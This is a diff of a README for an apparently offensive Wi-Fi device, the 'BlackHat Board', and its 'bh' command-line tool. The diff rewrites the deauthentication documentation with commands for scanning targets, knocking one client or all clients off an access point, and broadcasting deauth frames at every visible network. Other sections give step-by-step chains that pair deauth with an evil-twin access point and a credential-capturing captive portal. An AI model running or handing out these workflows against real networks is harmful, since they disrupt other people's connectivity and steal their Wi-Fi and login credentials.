@@ -54,34 +54,52 @@ Deploys a captive portal that intercepts and captures user credentials. The port
 - `index3.html` - Tertiary portal page
 
 ### Deauthentication Attacks
+
+**Professional-grade deauth functionality with explicit targeting:**
+
+#### **Target Discovery**
 ```bash
-bh deauth <target>              # Disconnect clients from networks
+bh deauth_scan [interface]      # Scan for targets and show available APs/clients
 ```
 
-**Target Types:**
-- **SSID Name**: Disconnects all clients from specified network (must be connected to that network)
-  ```bash
-  bh deauth "HomeWiFi_5G"       # Disconnect all clients from HomeWiFi_5G
-  ```
-- **MAC Address**: Disconnects specific device by MAC address
-  ```bash
-  bh deauth aa:bb:cc:dd:ee:ff   # Disconnect specific device
-  ```
-- **Hostname**: Disconnects device by hostname (must be on same network as BlackHat board)
-  ```bash
-  bh deauth laptop-john         # Disconnect John's laptop
-  ```
+#### **Specific Client Attack**  
+```bash
+bh deauth <client_mac> <ap_mac> [interface] [count]
+# Example: bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1
+```
+
+#### **All Clients from AP**
+```bash
+bh deauth_all <ap_mac> [interface] [count]  
+# Example: bh deauth_all 11:22:33:44:55:66 wlan1
+```
+
+#### **Nuclear Option (All Networks)**
+```bash
+bh deauth_broadcast [interface] [count]     # WARNING: Attacks all visible networks
+```
+
+**Interface Usage:**
+- **wlan0** (2.4GHz onboard): Use for 2.4GHz targets or when wlan1 unavailable
+- **wlan1** (5GHz USB): Default for attacks, allows maintaining SSH connection on wlan0
+- **Automatic fallback**: Commands default to wlan1, specify wlan0 if needed
 
 **Technical Details:**
-- Automatically uses appropriate interface (prefers 5GHz USB dongle for monitor mode)
-- Sends configurable number of deauth frames (default: 10)
-- Supports both 2.4GHz and 5GHz networks
-- Can target specific clients or entire networks
+- **Explicit targeting**: No guesswork - specify exact client and AP MACs
+- **Dual-radio advantage**: Stay connected on wlan0 while attacking with wlan1
+- **Configurable count**: Default 10 deauth frames, customizable
+- **Monitor mode management**: Automatically handles interface setup/teardown
+- **Professional workflow**: Scan → Identify → Attack
 
-**Limitations:**
-- Hostname resolution only works for devices on the same network you're connected to
-- For external networks, must use MAC addresses obtained from scanning
-- Some modern devices may reconnect quickly after deauth
+**Interface Caveats:**
+- **Cannot use same interface** for connection and monitor mode simultaneously
+- **wlan0 connection preserved** when using wlan1 for attacks
+- **Monitor mode conflicts**: Reset interface if "Failed to set monitor mode"
+  ```bash
+  # Interface reset if needed:
+  iw dev wlan1 set type managed
+  ip link set wlan1 down && ip link set wlan1 up
+  ```
 
 ## Monitoring & Intelligence
 
@@ -157,14 +175,14 @@ bh evil_twin
 
 ### 3. Deauthentication Attacks
 ```bash
-# Disconnect all clients from target network (if connected)
-bh deauth "TargetNetwork"
+# Scan for targets first (keeps wlan0 connected for SSH)
+bh deauth_scan wlan1
 
-# Disconnect specific device
-bh deauth aa:bb:cc:dd:ee:ff
+# Attack specific client (use MACs from scan results)
+bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1
 
-# Disconnect device by hostname (same network)
-bh deauth laptop-victim
+# Disconnect all clients from an AP
+bh deauth_all 11:22:33:44:55:66 wlan1
 ```
 
 ### 4. Credential Harvesting
@@ -178,13 +196,49 @@ bh evil_portal
 ### 5. Advanced Attack Scenarios
 ```bash
 # Deauth + Evil Twin combination
-bh deauth "LegitNetwork"        # Force disconnect clients
-bh set AP_SSID "LegitNetwork"   # Create fake AP with same name
-bh evil_portal                  # Capture credentials when clients reconnect
+bh deauth_scan wlan1                        # Scan for targets
+bh deauth_all 11:22:33:44:55:66 wlan1      # Force disconnect all clients from target AP
+bh set AP_SSID "LegitNetwork"               # Create fake AP with same name  
+bh evil_portal                              # Capture credentials when clients reconnect
 
-# Targeted deauth for specific user
-bh deauth john-laptop           # Disconnect specific user
-bh kismet wlan1                 # Monitor for reconnection attempts
+# Targeted deauth + monitoring
+bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1  # Disconnect specific user
+bh kismet wlan0                             # Monitor for reconnection attempts
+
+# Multi-band attack coordination
+bh wifi con wlan0              # Connect to 2.4GHz network for internet
+bh deauth_scan wlan1           # Attack 5GHz networks with USB dongle
+bh deauth_all [5GHz_AP] wlan1  # Attack 5GHz while maintaining 2.4GHz connection
+```
+
+## Hardware Configuration
+
+The BlackHat Board features a dual-radio design optimized for wireless security testing:
+
+### **Radio Configuration**
+- **wlan0 (RTL8723DS)**: 2.4GHz onboard radio with integrated antenna
+- **wlan1 (RTL8821CU)**: 2.4GHz/5GHz USB dongle for enhanced capability
+
+### **Interface Management Best Practices**
+- **SSH Access**: Connect wlan0 to a stable network for remote access
+- **Attack Operations**: Use wlan1 for monitor mode and injection attacks
+- **Dual-Band Strategy**: Attack 5GHz networks with wlan1 while maintaining 2.4GHz connection on wlan0
+- **Interface Reset**: If monitor mode fails, reset interface to managed mode first
+
+### **Typical Setup Workflow**
+```bash
+# 1. Establish stable connection for SSH access
+bh set SSID "YourNetwork"
+bh set PASS "YourPassword"  
+bh wifi con wlan0
+
+# 2. Use wlan1 for attacks
+bh deauth_scan wlan1
+bh deauth [targets] wlan1
+
+# 3. Restore interfaces if needed
+iw dev wlan1 set type managed  # Reset to managed mode
+ip link set wlan1 down && ip link set wlan1 up
 ```
 
 ## Security Considerations
